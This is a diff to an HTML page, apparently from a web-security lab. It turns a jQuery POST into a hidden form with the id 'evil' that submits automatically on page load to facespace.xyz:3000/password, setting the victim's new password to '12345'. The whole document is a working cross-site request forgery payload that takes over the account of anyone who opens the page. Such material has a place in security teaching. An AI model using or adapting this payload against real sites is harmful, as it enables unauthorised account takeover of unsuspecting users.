@@ -5,11 +5,15 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
   <script type="text/javascript">
   window.onload = function() {
-    $.post (
-      "http://localhost:5000/password",
-      {"new_password": "12345", "confirm_new_password": "12345"}
-    )
+    $('#evil').submit();
   };
     </script>
 </head>
+
+<body>
+<form action="http://facespace.xyz:3000/password" method="POST" id="evil">
+  <input type="hidden" name="new_password" value="12345"></input>
+  <input type="hidden" name="confirm_new_password" value="12345"></input>
+</form>
+</body>
 </html>
